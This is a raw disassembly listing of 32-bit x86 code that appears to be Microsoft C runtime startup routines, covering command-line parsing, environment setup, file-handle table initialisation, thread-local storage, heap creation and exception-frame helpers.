  424ce3:	inc    ebx
  424ce4:	xor    edx,edx
  424ce6:	jmp    0x424cea
  424ce8:	inc    eax
  424ce9:	inc    edx
  424cea:	cmp    BYTE PTR [eax],0x5c
  424ced:	je     0x424ce8
  424cef:	cmp    BYTE PTR [eax],0x22
  424cf2:	jne    0x424d1a
  424cf4:	test   dl,0x1
  424cf7:	jne    0x424d18
  424cf9:	cmp    DWORD PTR [ebp-0x4],0x0
  424cfd:	je     0x424d0b
  424cff:	lea    ecx,[eax+0x1]
  424d02:	cmp    BYTE PTR [ecx],0x22
  424d05:	jne    0x424d0b
  424d07:	mov    eax,ecx
  424d09:	jmp    0x424d0d
  424d0b:	xor    ebx,ebx
  424d0d:	xor    ecx,ecx
  424d0f:	cmp    DWORD PTR [ebp-0x4],ecx
  424d12:	sete   cl
  424d15:	mov    DWORD PTR [ebp-0x4],ecx
  424d18:	shr    edx,1
  424d1a:	test   edx,edx
  424d1c:	je     0x424d2b
  424d1e:	test   edi,edi
  424d20:	je     0x424d26
  424d22:	mov    BYTE PTR [edi],0x5c
  424d25:	inc    edi
  424d26:	inc    DWORD PTR [esi]
  424d28:	dec    edx
  424d29:	jne    0x424d1e
  424d2b:	mov    cl,BYTE PTR [eax]
  424d2d:	test   cl,cl
  424d2f:	je     0x424d79
  424d31:	cmp    DWORD PTR [ebp-0x4],0x0
  424d35:	jne    0x424d41
  424d37:	cmp    cl,0x20
  424d3a:	je     0x424d79
  424d3c:	cmp    cl,0x9
  424d3f:	je     0x424d79
  424d41:	test   ebx,ebx
  424d43:	je     0x424d73
  424d45:	test   edi,edi
  424d47:	je     0x424d62
  424d49:	movzx  edx,cl
  424d4c:	test   BYTE PTR [edx+0x45df21],0x4
  424d53:	je     0x424d5b
  424d55:	mov    BYTE PTR [edi],cl
  424d57:	inc    edi
  424d58:	inc    eax
  424d59:	inc    DWORD PTR [esi]
  424d5b:	mov    cl,BYTE PTR [eax]
  424d5d:	mov    BYTE PTR [edi],cl
  424d5f:	inc    edi
  424d60:	jmp    0x424d71
  424d62:	movzx  ecx,cl
  424d65:	test   BYTE PTR [ecx+0x45df21],0x4
  424d6c:	je     0x424d71
  424d6e:	inc    eax
  424d6f:	inc    DWORD PTR [esi]
  424d71:	inc    DWORD PTR [esi]
  424d73:	inc    eax
  424d74:	jmp    0x424ce1
  424d79:	test   edi,edi
  424d7b:	je     0x424d81
  424d7d:	and    BYTE PTR [edi],0x0
  424d80:	inc    edi
  424d81:	inc    DWORD PTR [esi]
  424d83:	mov    ebx,DWORD PTR [ebp+0xc]
  424d86:	jmp    0x424cac
  424d8b:	mov    eax,DWORD PTR [ebp+0x8]
  424d8e:	test   eax,eax
  424d90:	je     0x424d95
  424d92:	and    DWORD PTR [eax],0x0
  424d95:	inc    DWORD PTR [ebx]
  424d97:	pop    edi
  424d98:	pop    ebx
  424d99:	leave  
  424d9a:	ret    
  424d9b:	push   ebp
  424d9c:	mov    ebp,esp
  424d9e:	push   ecx
  424d9f:	push   ecx
  424da0:	push   ebx
  424da1:	push   esi
  424da2:	push   edi
  424da3:	xor    edi,edi
  424da5:	cmp    DWORD PTR ds:0x45e26c,edi
  424dab:	jne    0x424db2
  424dad:	call   0x425f3c
  424db2:	and    BYTE PTR ds:0x45dc14,0x0
  424db9:	push   0x104
  424dbe:	mov    esi,0x45db10
  424dc3:	push   esi
  424dc4:	push   edi
  424dc5:	call   DWORD PTR ds:0x42906c
  424dcb:	mov    eax,ds:0x45e274
  424dd0:	cmp    eax,edi
  424dd2:	mov    DWORD PTR ds:0x45daf4,esi
  424dd8:	je     0x424de1
  424dda:	cmp    BYTE PTR [eax],0x0
  424ddd:	mov    ebx,eax
  424ddf:	jne    0x424de3
  424de1:	mov    ebx,esi
  424de3:	lea    eax,[ebp-0x4]
  424de6:	push   eax
  424de7:	push   edi
  424de8:	lea    esi,[ebp-0x8]
  424deb:	xor    ecx,ecx
  424ded:	mov    eax,ebx
  424def:	call   0x424c2f
  424df4:	mov    esi,DWORD PTR [ebp-0x4]
  424df7:	mov    eax,DWORD PTR [ebp-0x8]
  424dfa:	shl    esi,0x2
  424dfd:	add    eax,esi
  424dff:	push   eax
  424e00:	call   0x426072
  424e05:	mov    edi,eax
  424e07:	add    esp,0xc
  424e0a:	test   edi,edi
  424e0c:	jne    0x424e13
  424e0e:	or     eax,0xffffffff
  424e11:	jmp    0x424e38
  424e13:	lea    eax,[ebp-0x4]
  424e16:	push   eax
  424e17:	lea    ecx,[esi+edi*1]
  424e1a:	push   edi
  424e1b:	lea    esi,[ebp-0x8]
  424e1e:	mov    eax,ebx
  424e20:	call   0x424c2f
  424e25:	mov    eax,DWORD PTR [ebp-0x4]
  424e28:	dec    eax
  424e29:	pop    ecx
  424e2a:	mov    ds:0x45dad8,eax
  424e2f:	pop    ecx
  424e30:	mov    DWORD PTR ds:0x45dadc,edi
  424e36:	xor    eax,eax
  424e38:	pop    edi
  424e39:	pop    esi
  424e3a:	pop    ebx
  424e3b:	leave  
  424e3c:	ret    
  424e3d:	push   ecx
  424e3e:	push   ecx
  424e3f:	mov    eax,ds:0x45dc18
  424e44:	push   ebx
  424e45:	push   ebp
  424e46:	push   esi
  424e47:	push   edi
  424e48:	mov    edi,DWORD PTR ds:0x429084
  424e4e:	xor    ebx,ebx
  424e50:	xor    esi,esi
  424e52:	cmp    eax,ebx
  424e54:	push   0x2
  424e56:	pop    ebp
  424e57:	jne    0x424e86
  424e59:	call   edi
  424e5b:	mov    esi,eax
  424e5d:	cmp    esi,ebx
  424e5f:	je     0x424e6d
  424e61:	mov    DWORD PTR ds:0x45dc18,0x1
  424e6b:	jmp    0x424e8b
  424e6d:	call   DWORD PTR ds:0x429028
  424e73:	cmp    eax,0x78
  424e76:	jne    0x424e81
  424e78:	mov    eax,ebp
  424e7a:	mov    ds:0x45dc18,eax
  424e7f:	jmp    0x424e86
  424e81:	mov    eax,ds:0x45dc18
  424e86:	cmp    eax,0x1
  424e89:	jne    0x424f08
  424e8b:	cmp    esi,ebx
  424e8d:	jne    0x424e97
  424e8f:	call   edi
  424e91:	mov    esi,eax
  424e93:	cmp    esi,ebx
  424e95:	je     0x424f10
  424e97:	cmp    WORD PTR [esi],bx
  424e9a:	mov    eax,esi
  424e9c:	je     0x424eac
  424e9e:	add    eax,ebp
  424ea0:	cmp    WORD PTR [eax],bx
  424ea3:	jne    0x424e9e
  424ea5:	add    eax,ebp
  424ea7:	cmp    WORD PTR [eax],bx
  424eaa:	jne    0x424e9e
  424eac:	mov    edi,DWORD PTR ds:0x429080
  424eb2:	push   ebx
  424eb3:	push   ebx
  424eb4:	push   ebx
  424eb5:	sub    eax,esi
  424eb7:	push   ebx
  424eb8:	sar    eax,1
  424eba:	inc    eax
  424ebb:	push   eax
  424ebc:	push   esi
  424ebd:	push   ebx
  424ebe:	push   ebx
  424ebf:	mov    DWORD PTR [esp+0x34],eax
  424ec3:	call   edi
  424ec5:	mov    ebp,eax
  424ec7:	cmp    ebp,ebx
  424ec9:	je     0x424efd
  424ecb:	push   ebp
  424ecc:	call   0x426072
  424ed1:	cmp    eax,ebx
  424ed3:	pop    ecx
  424ed4:	mov    DWORD PTR [esp+0x10],eax
  424ed8:	je     0x424efd
  424eda:	push   ebx
  424edb:	push   ebx
  424edc:	push   ebp
  424edd:	push   eax
  424ede:	push   DWORD PTR [esp+0x24]
  424ee2:	push   esi
  424ee3:	push   ebx
  424ee4:	push   ebx
  424ee5:	call   edi
  424ee7:	test   eax,eax
  424ee9:	jne    0x424ef9
  424eeb:	push   DWORD PTR [esp+0x10]
  424eef:	call   0x425f5a
  424ef4:	pop    ecx
  424ef5:	mov    DWORD PTR [esp+0x10],ebx
  424ef9:	mov    ebx,DWORD PTR [esp+0x10]
  424efd:	push   esi
  424efe:	call   DWORD PTR ds:0x42907c
  424f04:	mov    eax,ebx
  424f06:	jmp    0x424f58
  424f08:	cmp    eax,ebp
  424f0a:	je     0x424f14
  424f0c:	cmp    eax,ebx
  424f0e:	je     0x424f14
  424f10:	xor    eax,eax
  424f12:	jmp    0x424f58
  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
